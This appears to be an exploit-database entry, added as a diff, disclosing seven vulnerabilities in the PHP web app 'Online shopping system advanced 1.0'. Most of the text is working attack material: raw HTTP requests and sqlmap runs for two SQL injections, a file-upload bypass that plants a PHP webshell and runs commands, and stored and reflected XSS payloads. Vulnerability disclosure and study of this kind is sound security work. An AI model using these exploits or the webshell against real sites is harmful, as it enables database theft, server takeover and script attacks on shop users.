@@ -1,0 +1,350 @@
+id: 38345
+date: 03/28/2023
+title: Online shopping system advanced 1.0 - Multiple Vulnerabilities
+author: Rafael Pedrero
+cves: 
+
+# Exploit Title: Online shopping system advanced 1.0 - Multiple
+Vulnerabilities
+# Discovery by: Rafael Pedrero
+# Vendor Homepage:
+https://github.com/PuneethReddyHC/online-shopping-system-advanced
+# Software Link :
+https://github.com/PuneethReddyHC/online-shopping-system-advanced/archive/master.zip
+# Tested Version: 1.0
+# Tested on:  Windows 10 using XAMPP / Linux Ubuntu server 18.04 + Apache +
+php 5.X/7.X + MySQL
+
+# Recap: SQLi = 2, RCE = 1, stored XSS = 2, reflected XSS = 2: 7
+vulnerabilities
+
+# Vulnerability Type: SQL Injection - #1
+
+CVSS v3: 9.8
+CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE: CWE-89
+
+Vulnerability description: Online shopping system advanced 1.0 allows SQL
+injection via the admin/edit_user.php, user_id parameter.
+
+Proof of concept:
+
+Save this content in a file:
+
+POST http://127.0.0.1/online/admin/edit_user.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: multipart/form-data;
+boundary=---------------------------120411781422335
+Content-Length: 489
+Origin: http://127.0.0.1
+Connection: keep-alive
+Referer: http://127.0.0.1/online/admin/edit_user.php?user_id=25
+Cookie: PHPSESSID=cbj0b7afni7t7hpl5opt207263
+Upgrade-Insecure-Requests: 1
+Host: 127.0.0.1
+
+-----------------------------120411781422335
+Content-Disposition: form-data; name="user_id"
+
+25
+-----------------------------120411781422335
+Content-Disposition: form-data; name="email"
+
+otheruser@gmail.com
+-----------------------------120411781422335
+Content-Disposition: form-data; name="password"
+
+puneeth@123
+-----------------------------120411781422335
+Content-Disposition: form-data; name="btn_save"
+
+
+-----------------------------120411781422335--
+
+
+And execute SQLMAP: >python sqlmap.py -r 1.txt --dbms=mysql -p user_id
+
+(custom) POST parameter 'MULTIPART user_id' is vulnerable. Do you want to
+keep testing the others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 115
+HTTP(s) requests:
+---
+Parameter: MULTIPART user_id ((custom) POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: -----------------------------120411781422335
+Content-Disposition: form-data; name="user_id"
+
+25' AND SLEEP(5) AND 'HGWF'='HGWF
+-----------------------------120411781422335
+Content-Disposition: form-data; name="email"
+
+otheruser@gmail.com
+-----------------------------120411781422335
+Content-Disposition: form-data; name="password"
+
+puneeth@123
+-----------------------------120411781422335
+Content-Disposition: form-data; name="btn_save"
+
+
+-----------------------------120411781422335--
+---
+[16:25:28] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+
+
+# Vulnerability Type: SQL Injection - #2
+
+CVSS v3: 9.8
+CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE: CWE-89
+
+Vulnerability description: Online shopping system advanced 1.0 allows SQL
+injection via the action.php, proId parameter.
+
+Proof of concept:
+
+Save this content in a file:
+
+POST http://127.0.0.1/online/action.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 49
+Origin: http://127.0.0.1
+Connection: keep-alive
+Referer: http://127.0.0.1/online/
+Cookie: PHPSESSID=cbj0b7afni7t7hpl5opt207263
+Host: 127.0.0.1
+
+addToCart=1&proId=70
+
+
+And execute SQLMAP: >python sqlmap.py -r 1.txt --dbms=mysql -p proId
+
+POST parameter 'proId' is vulnerable. Do you want to keep testing the
+others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 72
+HTTP(s) requests:
+---
+Parameter: proId (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: addToCart=1&proId=70' AND 7704=7704 AND 'IGsd'='IGsd
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: addToCart=1&proId=70' AND SLEEP(5) AND 'pAwv'='pAwv
+---
+[16:03:38] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+
+
+# Vulnerability Type: Remote Command Execution (RCE)
+
+CVSS v3: 9.8
+CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE: CWE-434
+
+Vulnerability description: File Restriction Bypass vulnerabilities were
+found in Online shopping system advanced v1.0. This allows for an
+authenticated user to potentially obtain RCE via webshell.
+
+Proof of concept:
+
+1. Go the add product >> (admin/add_product.php)
+2.- Select product image and load a valid image.
+3. Turn Burp/ZAP Intercept On
+4. Select webshell - ex: shell.php
+5. Alter request in the upload...
+   Update 'filename' to desired extension. ex: shell.php
+   Not neccesary change content type to 'image/png'
+
+Example exploitation request:
+
+====================================================================================================
+
+POST http://127.0.0.1/online/admin/add_product.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: multipart/form-data;
+boundary=---------------------------184982084830387
+Content-Length: 960
+Origin: http://127.0.0.1
+Connection: keep-alive
+Referer: http://127.0.0.1/online/admin/add_product.php
+Cookie: PHPSESSID=cbj0b7afni7t7hpl5opt207263
+Upgrade-Insecure-Requests: 1
+Host: 127.0.0.1
+
+-----------------------------184982084830387
+Content-Disposition: form-data; name="product_name"
+
+demo2
+-----------------------------184982084830387
+Content-Disposition: form-data; name="details"
+
+demo2
+-----------------------------184982084830387
+Content-Disposition: form-data; name="picture"; filename="shell.php"
+Content-Type: image/gif
+
+<?php echo "<pre>";system($_REQUEST['cmd']);echo "</pre>"  ?>
+-----------------------------184982084830387
+Content-Disposition: form-data; name="price"
+
+1
+-----------------------------184982084830387
+Content-Disposition: form-data; name="product_type"
+
+1
+-----------------------------184982084830387
+Content-Disposition: form-data; name="brand"
+
+1
+-----------------------------184982084830387
+Content-Disposition: form-data; name="tags"
+
+Summet
+-----------------------------184982084830387
+Content-Disposition: form-data; name="submit"
+
+
+-----------------------------184982084830387--
+
+====================================================================================================
+
+6. To view the webshell path go to Product List (admin/cosmetics_list.php)
+7. Send the request and visit your new webshell
+   Ex:
+http://127.0.0.1/online/product_images/1600959116_shell.php?cmd=whoami
+       nt authority\system
+
+# Vulnerability Type: stored Cross-Site Scripting (XSS) - #1
+
+CVSS v3: 6.5
+CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+CWE: CWE-79
+
+Vulnerability description: Online shopping system advanced v1.0, does not
+sufficiently encode user-controlled inputs, resulting in a stored
+Cross-Site Scripting (XSS) vulnerability via the admin/edit_user.php, in
+multiple parameter.
+
+Proof of concept:
+
+Stored:
+
+POST http://127.0.0.1/online/admin/edit_user.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: multipart/form-data;
+boundary=---------------------------120411781422335
+Content-Length: 496
+Origin: http://127.0.0.1
+Connection: keep-alive
+Referer: http://127.0.0.1/online/admin/edit_user.php?user_id=25
+Cookie: PHPSESSID=cbj0b7afni7t7hpl5opt207263
+Upgrade-Insecure-Requests: 1
+Host: 127.0.0.1
+
+-----------------------------120411781422335
+Content-Disposition: form-data; name="user_id"
+
+25
+-----------------------------120411781422335
+Content-Disposition: form-data; name="email"
+
+otheruser@gmail.com
+-----------------------------120411781422335
+Content-Disposition: form-data; name="password"
+
+</td><script>alert(1);</script><td>
+-----------------------------120411781422335
+Content-Disposition: form-data; name="btn_save"
+
+
+-----------------------------120411781422335--
+
+
+# Vulnerability Type: stored Cross-Site Scripting (XSS) - #2
+
+CVSS v3: 6.5
+CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+CWE: CWE-79
+
+Vulnerability description: Online shopping system advanced v1.0, does not
+sufficiently encode user-controlled inputs, resulting in a stored
+Cross-Site Scripting (XSS) vulnerability via the admin/add_user.php, in
+multiple parameter.
+
+Proof of concept:
+
+Stored:
+
+POST http://127.0.0.1/online/admin/add_user.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+Origin: http://127.0.0.1
+Connection: keep-alive
+Referer: http://127.0.0.1/online/admin/add_user.php
+Cookie: PHPSESSID=cbj0b7afni7t7hpl5opt207263
+Upgrade-Insecure-Requests: 1
+Host: 127.0.0.1
+
+first_name=demo&last_name=demo&email=demo%40localhost.inet&user_password=demo&mobile=5555555555&address1=%3C%2Ftd%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Ctd%3E&address2=here+5&btn_save=
+
+
+# Vulnerability Type: reflected Cross-Site Scripting (XSS) - #1
+
+CVSS v3: 6.1
+CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+CWE: CWE-79
+
+Vulnerability description: Online shopping system advanced v1.0, does not
+sufficiently encode user-controlled inputs, resulting in a reflected
+Cross-Site Scripting (XSS) vulnerability via the admin/clothes_list.php, in
+page parameter.
+
+Proof of concept:
+
+Reflected:
+
+http://127.0.0.1/online/admin/clothes_list.php?page=%3C%2Fh1%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Ch1%3E
+
+
+# Vulnerability Type: reflected Cross-Site Scripting (XSS) - #2
+
+CVSS v3: 6.1
+CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+CWE: CWE-79
+
+Vulnerability description: Online shopping system advanced v1.0, does not
+sufficiently encode user-controlled inputs, resulting in a reflected
+Cross-Site Scripting (XSS) vulnerability via the admin/cosmetics_list.php,
+in page parameter.
+
+Proof of concept:
+
+Reflected:
+
+http://127.0.0.1/online/admin/cosmetics_list.php?page=%3C%2Fh1%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Ch1%3E
+
+#  0day.today [2023-04-03]  #
